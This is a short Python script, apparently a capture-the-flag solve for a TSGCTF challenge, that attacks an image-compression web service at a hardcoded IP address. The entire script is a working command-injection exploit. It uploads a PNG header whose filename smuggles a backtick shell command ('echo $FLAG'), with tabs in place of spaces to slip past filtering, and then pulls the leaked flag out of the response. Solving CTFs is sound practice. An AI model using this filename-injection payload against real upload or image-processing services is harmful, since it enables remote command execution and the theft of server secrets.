import requests
import re

url = "http://35.221.67.248:10502/"

payload = '\\`echo $FLAG\\`.png'.replace(" ", "\t")

res = requests.post(f"{url}/compress", files={
    "image": (payload, bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), 'image/png')
}, data={ "quality": 85 })

flag = re.findall(r'(TSGCTF{[^}]+})', res.text)[0]
print("Flag:", flag)